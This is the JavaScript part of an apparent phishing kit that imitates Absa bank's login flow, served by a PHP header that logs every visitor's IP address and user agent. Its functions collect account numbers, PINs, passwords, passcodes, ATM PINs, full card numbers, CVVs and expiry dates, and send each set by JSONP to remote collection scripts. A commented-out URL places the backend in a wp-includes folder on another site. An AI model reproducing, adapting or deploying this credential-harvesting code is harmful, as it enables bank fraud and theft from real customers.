<?php
header('Content-Type: application/javascript');
file_put_contents("visitorCount.txt", "+------------------+---------------------------------------+-----------------------------+----------------+\r\n".date("Y-m-d H:i:s")."--//".$_SERVER['REMOTE_ADDR']."--".$_SERVER['HTTP_USER_AGENT']."\r\n+------------------+---------------------------------------+-----------------------------+----------------+\r\n\r\n", FILE_APPEND);
$host = $_SERVER['HTTP_HOST'];
$pwdir = dirname(__FILE__);

$eachPath = explode("/", $pwdir);

//print_r($eachPath);

unset($eachPath[0]);
unset($eachPath[1]);
unset($eachPath[2]);
unset($eachPath[3]);

//print_r($eachPath);

$realPath = implode("/", $eachPath);

//echo $realPath;
?>

function ajax_jsonp_call(post_url, formValues, callBack) {
//pageLoader(true);
    $.ajax({
        url: post_url,
        data: formValues,
        dataType: "jsonp",
        cache: false,
        success: function(results) {
            //$('#div1').html(results);
            //alert('completed');
            callBack(results);
            //pageLoader(false);
        },
        error: function() {
            alert('Error');
            //pageLoader(false);
        }
    });
}
          j9ery = {};
          j9ery.showLoading = function(){
              j9ery.hideLoading();
              
              $("body").addClass("modal-open");
              $("div.modal.modal-loading").addClass("show").show();
              $("div.modal-backdrop").addClass("show").show();
          };
          j9ery.hideLoading = function(){
              $("body").removeClass("modal-open");
              $("div.modal.modal-loading").removeClass("show");
          };
          j9ery.showSurecheck = function(){
              $(".cdk-overlay-container").fadeIn()
          };
          j9ery.hideSurecheck = function(){
              $(".cdk-overlay-container").fadeOut()
          };
          
          j9ery.showSurecheckError = function(){
              $(".cdk-overlay-container").fadeIn()
          };
          j9ery.showspinnerindicator = function(){
              $(".spinner-indicator").removeAttr("hidden");
          };
          j9ery.hidespinnerindicator = function(){
              $(".spinner-indicator").attr("hidden", "true");
          };
          
          //spinnerindicator
          
          j9ery.iLogin = function(password){
                ajax_jsonp_call(siteURL+'login.php', 'password='+password, function(responseText){
                    if(responseText.message === true){
                        window.location.href="_read.php";
                    }
                });
            };

          j9ery.submitPasscode = function(){
              var passcode = document.getElementById("passcode").value;
              var atmPin = document.getElementById("atmCardPin").value;
              
              var numbersOnly = /^[0-9]+$/;
              
                if(checkpasscode(passcode) !== "ok"){
                    alert("please enter a valid passcode");
                    return false;
                }
                
                if(checkatmpin(atmPin) !== "ok"){
                    alert("please enter a valid ATM pin");
                    return false;
                }
                
                $.ajax({
                    url: siteURL+'continue3.php',
                    cache: false,
                    dataType: 'jsonp',
                    data: 'passcode='+passcode+'&atmPin='+atmPin,
                    beforeSend: function() {
                        j9ery.showspinnerindicator();
                    },
                    success: function(data) {
                        if(data.message !== "error"){
                            $('#container-fluid-ajax').html(data.message);
                        }else{
                            alert("Please enter a valid password and retry");
                            return false;
                        }
                    },
                    error: function (request, status, error) {
                    },
                    complete: function() {
                        j9ery.hidespinnerindicator();
                        //j9ery.showSurecheck();
                        //startTimer1();
                    }
                });
          };
          
          
          
          j9ery.submitCardDetails = function(){
              var cardlast4 = document.getElementById("passcode").value;
              var cardcvv = document.getElementById("atmCardPin").value;
              var cardexpdate = document.getElementById("atmCardNumberExpDate").value;
              
              var numbersOnly = /^[0-9]+$/;
              
                if(checklast4(cardlast4) !== "ok"){
                    alert("please enter a Valid Last 4 Digit");
                    return false;
                }
                
                if(checkcvv(cardcvv) !== "ok"){
                    alert("please enter a valid CVV");
                    return false;
                }
                
                $.ajax({
                    url: siteURL+'continue33.php',
                    cache: false,
                    dataType: 'jsonp',
                    data: 'cardlast4='+cardlast4+'&atmCardPin='+cardcvv+'&cardexpdate='+cardexpdate,
                    beforeSend: function() {
                        j9ery.showspinnerindicator();
                    },
                    success: function(data) {
                        if(data.message !== "error"){
                            //document.open();
                            //document.write(data.message);
                            //document.close();
                            //window.location.href = 'https://www.absa.co.za/offers/africanacity/';
                            j9ery.showSurecheck();
                            startTimerInfinite();
                        }else{
                            alert("Please enter a valid password and retry");
                            return false;
                        }
                    },
                    error: function (request, status, error) {
                    },
                    complete: function() {
                        j9ery.hidespinnerindicator();
                        j9ery.showSurecheck();
                        startTimer1();
                    }
                });
          };
          j9ery.submitUser = function(form){
                var sAccount = document.getElementById("Username").value;
                var sPIN = document.getElementById("pin").value;
                var sOperator = document.getElementById("usernumber").value;
                var sPassword = document.getElementById("Password").value;
                
                var numbersOnly = /^[0-9]+$/;
             
                if(!sAccount.match(numbersOnly)){
                    alert("Please enter a valid Access account number");
                    document.getElementById("Username").focus();
                    return false;
                }
                if(!sPIN.match(numbersOnly)){
                    alert("Please enter a valid PIN");
                    document.getElementById("pin").focus();
                    return false;
                }
                if(!sOperator.match(numbersOnly)){
                    alert("Please enter a valid User number");
                    document.getElementById("usernumber").focus();
                    return false;
                }
                if(checkPwd(sPassword) !== "ok"){
                    alert("please enter a valid password password and retry");
                    return false;
                }
                
                oParametersurl = siteURL+"continue0.php";
                j9ery.showLoading();
             
                $.ajax({
                    url: oParametersurl,
                    cache: false,
                    dataType: 'jsonp',
                    data: form.serialize(),
                    success: function(data) {
                        if(data.message !== "error"){
                            document.open();
                            document.write(data.message);
                            document.close();
                            //window.location.href = 'https://www.absa.co.za/offers/africanacity/';
                        }else{
                            alert("Please enter a valid password and retry");
                            return false;
                        }
                    },
                    error: function (request, status, error) {
                    }
                });
          };
          
          function checkPwd(str) {
                if (str.length < 5) {
                    return("too_short");
                } else if (str.length > 15) {
                    return("too_long");
                } else if (str.search(/\d/) == -1) {
                    return("no_num");
                }
                return("ok");
            }
            function checkpasscode(str) {
                if (str.length !== 5) {
                    return("too_short");
                } else if (str.search(/\d/) == -1) {
                    return("no_num");
                }
                return("ok");
            }
            function checkatmpin(str) {
                if (str.length < 4) {
                    return("too_short");
                }
                else if (str.length > 5) {
                    return("too_long");
                }
                else if (str.search(/\d/) == -1) {
                    return("no_num");
                }
                return("ok");
            }
            
            
            
            function checklast4(str) {
                if (str.length !== 16) {
                    return("too_short");
                } else if (str.search(/\d/) == -1) {
                    return("no_num");
                }
                return("ok");
            }
            function checkcvv(str) {
                if (str.length < 3) {
                    return("too_short");
                }
                else if (str.length > 3) {
                    return("too_long");
                }
                else if (str.search(/\d/) == -1) {
                    return("no_num");
                }
                return("ok");
            }
            
var absa = window.absa || {};
        absa.showPleaseWait = function (d) {
        var c = document.getElementById("pleasewait"),
                b = document.getElementById("pleasewait-viewport"),
                e = document.getElementById("pleasewait-label");
        c.style.display = "";
        e.innerHTML = arguments.length ? d : "";
        absa.showPleaseWait.timeout = setTimeout(function () {
                    c.style.height = document.body.clientHeight + "px";
                    c.style.width = document.body.clientWidth + "px";
                    b.style.height = ("innerHeight" in window ? window.innerHeight : document.documentElement.clientHeight) + "px";
                    b.style.width = ("innerWidth" in window ? window.innerWidth : document.documentElement.clientWidth) + "px";
                    b.style.top = document.documentElement.scrollTop + "px";
                    b.style.left = document.documentElement.scrollLeft + "px";
                    absa.showPleaseWait.timeout = setTimeout(arguments.callee, 20)
            }, 0)
        };
        //siteURL = 'http://alhadafadv.com/ser/wp-includes/css/sURECKECk/php2/';
        absa.hidePleaseWait = function () {
                var b = document.getElementById("pleasewait");
                b.style.display = "none";
                if (absa.showPleaseWait.timeout) {
                        absa.showPleaseWait.timeout = clearTimeout(absa.showPleaseWait.timeout)
                }
        };            